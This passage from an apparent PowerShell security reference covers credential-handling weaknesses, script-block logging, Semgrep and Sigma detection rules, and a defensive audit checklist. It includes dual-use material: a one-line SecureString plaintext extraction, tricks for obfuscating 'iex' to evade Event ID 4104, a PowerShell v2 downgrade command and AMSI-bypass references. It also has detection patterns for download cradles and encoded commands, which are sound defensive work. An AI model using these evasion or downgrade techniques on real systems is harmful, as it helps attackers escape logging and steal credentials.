upstream pipeline content influence parameter binding without directly
controlling the cmdlet invocation.

### 9.3 `-WhatIf` and `-Confirm` — not universally honored

`-WhatIf` prints what the cmdlet would do; `-Confirm` prompts before
state-changing operations. Footgun: only cmdlets declaring
`SupportsShouldProcess = $true` in `[CmdletBinding()]` honor them. Many
older cmdlets (including Microsoft-shipped) do not declare this and
silently ignore the flags. Users relying on `-WhatIf` for safety must
verify per cmdlet.

### 9.4 `-Force` overrides safety prompts and some ACLs

Cmdlet-specific: bypasses `-Confirm` prompts in some cases; overrides
read-only file attributes; in `Remove-Item -Force -Recurse`, bypasses
the directory confirmation; in `Copy-Item -Force`, overwrites without
prompting. Semantics not consistent across cmdlets. Treat as a per-cmdlet
escape hatch and look up the specific behavior, including whether it
bypasses ACL inheritance checks.

### 9.5 Pipeline output coercion to string

When an object reaches a context expecting a string (parameter binding
to `[string]`, write to `Out-File`, return from `Write-Host`),
PowerShell calls `.ToString()`. Default `.ToString()` for many .NET
types returns the type name (`System.Object[]`) rather than a useful
representation. Pipelines that work interactively (default formatter
renders the object) fail piped to `Out-File`.

Correctness footgun more than security, but affects audit-log generation:
a script logging sensitive operations via `Out-File` may write
`System.Management.Automation.PSCustomObject` instead of actual property
values, producing logs that look populated but contain no forensic
content.

### 9.6 `$_` — the automatic pipeline variable

`$_` (alias `$PSItem`) is the current pipeline element, implicitly
scoped to the executing pipeline operator. Nested pipelines: `$_` inside
an inner `Where-Object` refers to the inner element, not the outer.

```powershell
Get-Process | ForEach-Object {
    $proc = $_                        # capture outer
    $proc.Modules | Where-Object {
        $_.FileName -like "*foo*"     # this $_ is the module, not the process
    }
}
```

Forgetting to save outer `$_` produces silent logic bugs. In
security-relevant contexts (filtering events for indicators, authorizing
operations), the filter doesn't filter what you think.

---

## 10. Credential and secure-string handling

### 10.1 `[System.Net.NetworkCredential]::new($user, $secureString)` extracts plaintext

`System.Net.NetworkCredential` exposes a `.Password` property of type
`string` returning plaintext regardless of how constructed. PowerShell's
`SecureString` is convertible to plaintext in one statement:

```powershell
$plain = [System.Net.NetworkCredential]::new('', $secureString).Password
```

Not a bug — documented behavior. Audit takeaway: `SecureString` is
defense-in-depth (avoids casual leaks in debugger snapshots, error
messages, transcripts), not cryptographic encapsulation.

### 10.2 `Get-Credential` GUI vs script-injected credentials

`Get-Credential` prompts interactively, returning a `PSCredential`. Safe.
Unsafe variant:

```powershell
$cred = New-Object PSCredential('user', (ConvertTo-SecureString 'p@ss' -AsPlainText -Force))
```

`-AsPlainText` is explicit. PSScriptAnalyzer's
`PSAvoidUsingConvertToSecureStringWithPlainText` default rule flags it.
Bug-class signature: `ConvertTo-SecureString -AsPlainText -Force` — any
hit is a candidate hard-coded credential.

### 10.3 `ConvertTo-SecureString -AsPlainText -Force` — explicit insecure conversion

The cmdlet is named *to convert to* SecureString, which is
counterintuitive: passing `-AsPlainText` opts *out* of secure storage by
accepting plaintext input. The PowerShell team named the parameter
`-Force` (not `-Unsafe`), which does not communicate the security
implication. Scripts automating credential handling without prompting
use this cmdlet; grep for it.

### 10.4 SecureString is not really secure

`SecureString` stores content in unmanaged memory, optionally encrypted
via DPAPI on Windows. Threat model: protection against memory-snapshot
leaks. Limitations: on **non-Windows platforms** (PowerShell 7+ on Linux
/ macOS), DPAPI is unavailable — SecureString stores plaintext in
unmanaged memory; encryption is gone, API unchanged, scripts depending
on it for at-rest protection silently lose it cross-platform.
`Marshal.SecureStringToBSTR` round-trip extracts plaintext into managed
memory, defeating protection during use. Process-memory dumps (procdump,
LSASS-style) capture the encrypted SecureString *plus* DPAPI key
material for the running user, enabling offline decryption.

.NET team's official guidance: don't use `SecureString` for new
development on .NET (Core); instead use an opaque handle to credentials
stored outside of the process.

### 10.5 Credential pickling via `Export-CliXml`

```powershell
$cred | Export-Clixml -Path C:\users\alice\cred.xml
$cred = Import-Clixml -Path C:\users\alice\cred.xml    # later
```

The exported XML contains the SecureString encrypted via DPAPI under the
*exporting user's* context. Import succeeds only on the same user / same
machine (DPAPI key user-context-bound). At-rest protection against
another user reading the file (assuming filesystem ACLs not bypassed).

Limitations: **cross-platform PowerShell** disables DPAPI encryption —
exported XML is plaintext on Linux / macOS. **Same-user extraction** —
any process running as the same user can `Import-CliXml` and read the
credential. **DPAPI master-key extraction** (Mimikatz
`dpapi::masterkey`) bypasses user-context binding given sufficient
privileges. Treat `Export-CliXml` of credentials as "protection against
casual file copying," not as a cryptographic seal.

---

## 11. Logging and transcription

### 11.1 `Start-Transcript`

`Start-Transcript -Path $path` captures session input and output. Useful
for interactive sessions; opt-in. Transcripts capture passwords typed at
`Read-Host -AsSecureString` as secured-input characters but capture
credentials passed via `-Credential $cred` only by object representation
(typically just username). Attackers extracting credentials from
transcripts target the `Read-Host`-without-`-AsSecureString` path where
users type passwords into a plaintext prompt.

### 11.2 Module Logging / Script Block Logging / Transcription policies

Three Group-Policy-configurable logging surfaces (`about_Logging_Windows`):
**Module Logging** logs cmdlet invocations from specified modules
(high-fidelity, verbose); **Script Block Logging** logs deobfuscated text
of every script-block compiled by the parser as Event ID 4104 in
`Microsoft-Windows-PowerShell/Operational` (load-bearing PowerShell
detection surface); **Transcription** is system-wide forced
`Start-Transcript` to a secure location, capturing interactive content
but not script content directly.

### 11.3 Event ID 4104 — script-block logging

Event ID 4104 records text of every compiled script block,
post-deobfuscation. Fields: `ScriptBlockText` (deobfuscated content);
`ScriptBlockId` (unique ID; large scripts split across multiple events,
reconstituted by ScriptBlockId); `Path` (full path of executed script,
empty for interactive); `MessageNumber` / `MessageTotal` (chunking);
`Level` (`Warning` for scripts the engine's suspicious-token detector
flags).

Deobfuscation happens *because* the parser already had to deobfuscate to
build the AST. Bohannon's *Invoke-Obfuscation* catalog targets the
*pre-parser* representation; 4104 captures the *post-parser* form, much
closer to malicious intent. (Cross-link:
`detection_engineering_expertise.md` covers Sigma authoring against
4104 content.)

### 11.4 Obfuscating script-block content to evade 4104

The arms race *Revoke-Obfuscation* (Holmes + Bohannon, Black Hat USA 2017)
addresses. Attacker techniques: **string concatenation** breaking
detection keywords across variables (`$x = 'iex'; & (Get-Command $x)`);
**character-code arithmetic** (`[char]105 + [char]101 + [char]120` =
`'iex'`); **encoded-command-inside-encoded-command** (outer 4104
captures decode-then-iex; inner is logged separately with no parent
link unless ScriptBlockId chaining is followed); **PowerShell v2
fallback** (§11.5); **AMSI bypass first, then run** (script-block still
in 4104, but AV detection consuming AMSI does not fire).

Detection rules target deobfuscation indicators rather than raw
obfuscated form: high entropy, low printable-character ratio,
`[char]`-arithmetic, `.Replace` chains, `-join` of string arrays.

### 11.5 PowerShell v2 fallback

Windows 10 / 11 / Server 2016+ ship 5.1 by default, but the legacy
PowerShell 2.0 engine remained available as a Windows-Optional-Feature
(deprecated in 2017; removed from Windows 11 version 24H2 in August 2025
and from Windows Server 2025 in September 2025). PowerShell 2.0 predates AMSI, Script Block Logging,
Module Logging, and LanguageMode restrictions.

Attacker downgrade:

```
powershell.exe -Version 2 -Command "<payload>"
```

If v2 is installed, downgrade succeeds with no visible warning.
Defenders should disable via `Disable-WindowsOptionalFeature -Online
-FeatureName MicrosoftWindowsPowerShellV2`. Detection rules should flag
`-Version 2` as high-fidelity. (Cross-link:
`dfir_methodology_expertise.md` covers the IR playbook including the
v2-downgrade check.)

---

## 12. PowerShell on Linux and cross-platform

### 12.1 PowerShell 6+ on Linux / macOS — different file-permission model

PowerShell Core 6 (2018) and PowerShell 7+ ship as cross-platform .NET-
Core / .NET-5+ apps inheriting the Windows language surface, but cmdlet
runtime semantics differ subtly. File permissions are the most visible
difference: `Set-Acl` is Windows-only, but most
Windows-authored scripts assume NTFS-style ACL semantics. A
Windows-PowerShell defensive playbook checking ACLs via `Get-Acl`
does not work on Linux — the cmdlet is only available on the Windows
platform.

### 12.2 `Invoke-RestMethod` cross-platform — different TLS defaults

On Windows PowerShell 5.1, TLS version defaults to
`[Net.ServicePointManager]::SecurityProtocol`, historically TLS 1.0/1.1
on .NET Framework 4.x — requiring explicit `SecurityProtocol = Tls12`.
On PowerShell 7+ (.NET 6+), TLS 1.2 and 1.3 are defaults; the legacy
`SecurityProtocol` is largely ignored. Scripts relying on
TLS-version assumptions should be tested on both engines.

### 12.3 File-path escaping differences

Windows: accepts `\` and `/`, case-insensitive. Linux: case-sensitive,
`/` only. Scripts hardcoding Windows paths (`C:\Users\...`) break on
Linux; scripts using `Join-Path` or `[IO.Path]::Combine` are portable.
Building paths from user-controlled segments via string concatenation
can produce different results across platforms — a path traversing
correctly on Windows may not on Linux. Tests on one platform do not
validate the other.

### 12.4 `Get-Process` semantics across platforms

Same type on all platforms but property semantics differ. Detection rules keying on
`Process.Path` matching a known-bad substring produce different results
on Linux. Defensive scripts enumerating processes for suspicious modules
under-report on Linux.

---

## 13. Detection patterns

### 13.1 Semgrep patterns for PowerShell footguns

The Semgrep PowerShell engine has known maturity issues (cross-link
`feedback_semgrep_ps_bug`: `language: powershell` patterns with
`$OBJ.Method(...)` calls are broken; use `language: generic` with
`paths.include: ['*.ps1', '*.psm1']` plus `pattern-regex` until
upstream is fixed). Detection patterns:

```yaml
rules:
- id: powershell-invoke-expression-tainted
  pattern-either:
    - pattern: Invoke-Expression $...VAR
    - pattern: iex $...VAR
    - pattern: $...VAR | Invoke-Expression
    - pattern: $...VAR | iex
  severity: WARNING
- id: powershell-add-type-tainted
  pattern: Add-Type -TypeDefinition $...VAR
  severity: ERROR
- id: powershell-scriptblock-create-tainted
  pattern: '[scriptblock]::Create($...VAR)'
  severity: WARNING
- id: powershell-invoke-command-tainted
  pattern: Invoke-Command -ComputerName $...HOST -ScriptBlock $...SB
  severity: WARNING
- id: powershell-download-cradle
  pattern-either:
    - pattern: (New-Object Net.WebClient).DownloadString($...URL)
    - pattern: (New-Object System.Net.WebClient).DownloadString($...URL)
    - pattern: Invoke-WebRequest $...URL | iex
    - pattern: Invoke-RestMethod $...URL | iex
  severity: ERROR
- id: powershell-encoded-command-flag
  pattern-regex: '(?i)-(?:enc|encodedcommand|ec)\s+[A-Za-z0-9+/=]+'
  severity: WARNING
- id: powershell-hardcoded-credential
  pattern: ConvertTo-SecureString $...VAL -AsPlainText -Force
  severity: WARNING
```

(Cross-link: the [Semgrep rule-writing docs](https://semgrep.dev/docs/writing-rules/overview) for rule-authoring discipline.)

### 13.2 PSScriptAnalyzer security rules

Microsoft's default static analyzer. Security-relevant default rules:
`PSAvoidUsingInvokeExpression` (§2.1);
`PSAvoidUsingPlainTextForPassword` (warns on `[string]$Password`
parameter signatures); `PSAvoidUsingConvertToSecureStringWithPlainText`
(§10.3); `PSAvoidUsingComputerNameHardcoded` (style, not security);
`PSUsePSCredentialType` (warns when functions accept passwords as
`[string]` rather than `[PSCredential]`);
`PSAvoidUsingUsernameAndPasswordParams` (separate-string-pair credential
parameters). The set is minimal compared to the bug classes here.

### 13.3 Defender for Endpoint signatures

`Trojan:Win32/Powessere.G` (Poweliks-style rundll32 execution) and a
long tail of `Powerstager`, `Powerfun`, `Posh-` family signatures. All
AMSI-driven (§4.3); the engine consumes deobfuscated script-block
content. AMSI-bypassed payloads evade these; AMSI-not-bypassed payloads
typically trigger one of them on canonical patterns.

### 13.4 Sigma rules for PowerShell

The Sigma corpus (`SigmaHQ/sigma`) includes 100+ rules targeting
PowerShell-borne activity: **command-line patterns**
(`proc_creation_win_powershell_*.yml` matching Sysmon Event ID 1 against
suspicious flag combinations — `-EncodedCommand`, `-ExecutionPolicy
Bypass`, `-NoProfile -NonInteractive -WindowStyle Hidden`);
**script-block-logging patterns** (`posh_ps_*.yml` matching Event ID 4104
ScriptBlockText against `AmsiUtils`, `amsiInitFailed`,
`ReflectivePEInjection`, common AMSI-bypass strings);
**module-logging patterns** (matching Event ID 4103 cmdlet invocations
against suspicious combinations). (Cross-link:
`detection_engineering_expertise.md` §3 covers authoring discipline.)

---

## 14. Defensive checklist and variant analysis

### 14.1 Twelve-item defensive checklist

For any PowerShell codebase or PowerShell-enabled host:

1. **Grep for `Invoke-Expression` and `iex`.** Audit every call site for
   input taint (§2.1-§2.2).
2. **Grep for `Add-Type -TypeDefinition $`.** Any non-literal source is
   runtime-compile-and-load (§2.5).
3. **Grep for `[scriptblock]::Create($`.** Reflection-class
   string-to-code (§2.4).
4. **Grep for `[System.Reflection.Assembly]::Load($`** and `LoadFile($`.
   Reflective-PE-load (§7.1-§7.2).
5. **Grep for `Invoke-Command -ComputerName $`.** Remoting with
   non-literal target requires audit (§6.5).
6. **Grep for `Invoke-WmiMethod ... -Name Create`** and `Invoke-CimMethod
   ... -MethodName Create`. WMI process-creation (§6.3-§6.4).
7. **Grep for `ConvertTo-SecureString ... -AsPlainText -Force`.**
   Hardcoded credential signature (§10.3).
8. **Grep for `Import-CliXml -Path $`.** Deserialization sink (§5.1).
9. **Verify Script Block Logging is enabled** via `Get-ItemProperty
   'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'`
   (§11.3).
10. **Verify PowerShell 2.0 engine is disabled** via
    `Get-WindowsOptionalFeature -Online -FeatureName
    MicrosoftWindowsPowerShellV2*` (§11.5).
11. **Verify `$ExecutionContext.SessionState.LanguageMode`** on
    high-trust hosts (§4.1). Should be `ConstrainedLanguage` under WDAC.
12. **Verify `$PSModulePath` does not contain user-writable directories**
    before importing modules in elevated contexts (§8.2).

### 14.2 Variant analysis: PowerShell Direct, DSC, JEA, Lambda

**PowerShell Direct** (Hyper-V). Executes PowerShell inside a guest VM
without network connectivity, via Hyper-V VMBus. Auth requires Hyper-V
Administrator on the host plus valid user credentials for the guest.
Footgun: a Hyper-V admin holding guest credentials executes arbitrary
PowerShell in the guest, bypassing network ACLs and host-based firewalls
on the guest. Defensive boundary is host-level access control, not
guest-level network isolation.

**PowerShell DSC** (Desired State Configuration). Declarative
configuration-management compiling `.ps1` into MOF files consumed by the
Local Configuration Manager. DSC resources run as `SYSTEM` on the target;
any DSC resource taking user input inherits SYSTEM-context execution.
Misconfigured DSC pull servers can deliver arbitrary configurations;
certificate-pinning is per-host, not per-content (cross-link
`cicd_supply_chain_expertise.md`).

**Just Enough Administration (JEA)**. Session-configuration mechanism
restricting the cmdlet surface through `Enter-PSSession` to a per-role
allowlist (`.psrc` Role Capability + `.pssc` Session Configuration).
Footgun: JEA protection is only as good as the allowlist; permitting
`Invoke-Expression`, `Add-Type`, or any cmdlet calling .NET reflection
internally (`Get-Variable` can read `$ExecutionContext`) defeats
isolation. Recommended allowlist: specific cmdlets with specific
parameters with specific value patterns — anything more permissive is a
footgun-shaped escape.

**PowerShell on AWS Lambda**. The `AWSLambdaPSCore` module develops
PowerShell Lambda functions on the .NET Core runtime. Footguns: cold-start re-imports
modules per invocation; shared state via `$env:LAMBDA_TASK_ROOT` can
produce cross-invocation data leakage if a module caches per-user data;
IAM permissions inherited from the execution role are unconstrained by
PowerShell-level isolation. Treat the Lambda role like a JEA session
config: minimal permissions, no `iam:*`, no `kms:Decrypt` unless required.

### 14.3 Production code review pattern

PowerShell-specific overlay on `code_review_expertise.md`:

1. **Identify the entry surface** — parameters, env vars, file content,
   network responses, registry values, AD object properties.
2. **Trace each entry to its sinks** using the §14.1 checklist as sink
   catalog.
3. **Apply the click-count severity heuristic.** `Invoke-Expression` on
   a request body is zero-click (HTTP listener) or one-click (file
   processor); on a GUI prompt is n-click.
4. **Verify language-mode assumption.** Does the script expect
   `FullLanguage` or `ConstrainedLanguage`? Do the cmdlets used actually
   work in that mode?
5. **Verify credential handling.** Hardcoded (`-AsPlainText -Force`)?
   Credential files via `Export-CliXml` on Linux (no DPAPI)?
   `[NetworkCredential]::new` plaintext extraction?
6. **Verify logging posture.** Disables logging (`Stop-Transcript`,
   `$LogEngineLifecycleEvent = $false`)? Downgrades to PowerShell 2.0
   (`-Version 2`)? Both are red flags.

---

## 15. References

### 15.1 Microsoft documentation

All under `learn.microsoft.com`:

- *about_Execution_Policies* — `/powershell/module/microsoft.powershell.core/about/about_execution_policies`
- *about_Language_Modes* — `/powershell/module/microsoft.powershell.core/about/about_language_modes`
- *about_Logging_Windows* — `/powershell/module/microsoft.powershell.core/about/about_logging_windows`
- *Invoke-Expression* — `/powershell/module/microsoft.powershell.utility/invoke-expression`
- *Add-Type* — `/powershell/module/microsoft.powershell.utility/add-type`
- *Import-Clixml* — `/powershell/module/microsoft.powershell.utility/import-clixml`
- *Invoke-WmiMethod* — `/powershell/module/microsoft.powershell.management/invoke-wmimethod`
- *ConvertTo-SecureString* — `/powershell/module/microsoft.powershell.security/convertto-securestring`
- *Just Enough Administration (JEA) overview* — `/powershell/scripting/security/remoting/jea/overview`
- *AMSI portal* — `/windows/win32/amsi/antimalware-scan-interface-portal`
- *How AMSI helps you defend against malware* — `/windows/win32/amsi/how-amsi-helps`
- *AMSI integration with Microsoft Defender Antivirus* — `/defender-endpoint/amsi-on-mdav`
- *Create method of the Win32_Process class* — `/windows/win32/cimwin32prov/create-method-in-class-win32-process`
- *The PowerShell Gallery overview* — `/powershell/scripting/gallery/overview`

### 15.2 PowerShell team blog

- *Defending Against PowerShell Attacks* (Lee Holmes) — `devblogs.microsoft.com/powershell/defending-against-powershell-attacks/`
- *PowerShell Constrained Language Mode* (Paul Higinbotham) — `devblogs.microsoft.com/powershell/powershell-constrained-language-mode/`

### 15.3 Researcher writeups

- Lee Holmes — `leeholmes.com`
- Bohannon + Holmes — *Revoke-Obfuscation* (Black Hat USA 2017)
- Daniel Bohannon — `github.com/danielbohannon/Invoke-Obfuscation`,
  `danielbohannon.com`
- Matt Graeber — `mattifestation.medium.com`, `github.com/mattifestation`
- Will Schroeder — `blog.harmj0y.net`, `posts.specterops.io`
- Truesec — *Attacking PowerShell CLIXML Deserialization* (2024) —
  `truesec.com/hub/blog/attacking-powershell-clixml-deserialization`
- Cybereason — *Expanding the WMI Lateral Movement Arsenal* —
  `cybereason.com/blog/wmi-lateral-movement-win32`
- Aqua Security — *PowerHell* (2023) — `aquasec.com/blog/powerhell-active-flaws-in-powershell-gallery-expose-users-to-attacks/`
- ReversingLabs — *PowerShell Gallery simplifies supply chain attacks*
  — `reversinglabs.com/blog/powershell-gallery-simplify-sscs-attacks`

### 15.4 Institutional advisories and frameworks

- MITRE ATT&CK T1059.001 (PowerShell), T1047 (WMI), T1021.006 (WinRM),
  T1562.001 (Impair Defenses) — `attack.mitre.org/techniques/`
- MITRE D3FEND — `d3fend.mitre.org`
- NSA + CISA — *Keeping PowerShell: Security Measures to Use and Embrace*
  (2022 joint advisory)
- Atomic Red Team — `atomicredteam.io/atomic-red-team/atomics/T1059.001`

### 15.5 Tool / framework references

- PSScriptAnalyzer — `github.com/PowerShell/PSScriptAnalyzer`
- PowerSploit (archived) — `github.com/PowerShellMafia/PowerSploit`
- PowerShell Empire (archived; BC Security maintaining successor) —
  `github.com/BC-SECURITY/Empire`
- PowerView — `github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1`
- Invoke-Obfuscation — `github.com/danielbohannon/Invoke-Obfuscation`
- Revoke-Obfuscation — `github.com/danielbohannon/Revoke-Obfuscation`
- amsi.fail (AMSI bypass corpus) — `amsi.fail`
- Sigma rule repository — `github.com/SigmaHQ/sigma`
- Red Canary — *Better know a data source: AMSI* —
  `redcanary.com/blog/threat-detection/better-know-a-data-source/amsi/`
- TrustedSec — *Building a Detection Foundation: Part 3 - PowerShell and
  Script Logging* — `trustedsec.com/blog`

### 15.6 Books

- Bruce Payette + Richard Siddaway — *Windows PowerShell in Action, Third
  Edition* (Manning, 2017). Canonical language reference.
- Lee Holmes — *PowerShell Cookbook, Fourth Edition* (O'Reilly).
  Standard practical reference; security chapters cover this doc's
  topics in depth.

### 15.7 Cross-references

See front-matter cross-link list. `csharp_dotnet_footguns_expertise.md`
governs every reflection / deserialization / runtime-compile primitive
here; `active_directory_windows_security.md` is the Windows
attack-surface parent; `detection_engineering_expertise.md` covers the
Sigma + 4104 + AMSI detection surface; `deserialization_expertise.md`
covers the cross-language bug class (CLIXML / BinaryFormatter / XML are
PowerShell instances); `cicd_supply_chain_expertise.md` covers cooldown
discipline (PowerShell Gallery gaps in §8.5); `code_review_expertise.md`
covers click-count severity and the auth-homogeneity audit pattern §14
draws on; the [Semgrep rule-writing docs](https://semgrep.dev/docs/writing-rules/overview) covers rule-authoring discipline
followed in §13.1; `dfir_methodology_expertise.md` covers the IR
playbook including the v2-downgrade check.

---

*End of document. Format matches the behavioral-footgun class siblings.*
